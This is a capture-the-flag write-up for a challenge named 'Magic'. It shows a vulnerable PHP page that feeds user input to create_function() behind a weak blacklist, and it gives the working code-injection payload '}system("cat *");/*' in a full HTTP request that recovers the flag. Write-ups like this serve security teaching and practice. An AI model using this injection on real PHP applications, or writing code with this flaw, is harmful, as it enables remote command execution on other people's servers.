# Magic

Challenge URL: http://35.238.173.184/

We saw `admin.php` was interesting because of the PHP function below:

```php
include "flag.php";

if (isset ($_POST['c']) && !empty ($_POST['c'])) {
    $blacklist = "/mv|rm|exec/i";
    $code = $_POST['c'];
    if(strlen($code)>60) {
        die("too long to execute");
    }
    if(preg_match($blacklist,$code)){
        die("that's blocked");
    }
    $fun = create_function('$flag', $code);
    print($success);

}
```
We observed the blacklist only filtered a few commands and had no special character filters. We also tested more times, because the entire structure of the site was blind: we found out we had a 60 char limit for the payload.
Another function we noticed was `create_function('$flag', $code)`. We were allowed to inject interesting commands in `create_function()` (bash command injection).

`}system("cat *");/* ` was obtained with a template injection (https://github.com/swisskyrepo/PayloadsAllTheThings) and some attempts.
For this task we used **Burp Suite**: in _Repeater_ we put the following request:

```
?>
writeup
POST /admin.php HTTP/1.1
Host: 35.238.173.184
Content-Length: 33
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://35.238.173.184
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://35.238.173.184/admin.php
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

c=}system("cat *");/* 
```

`shaktictf{p0tn714l_0f_func710n5_4r3_1nf1n173}`
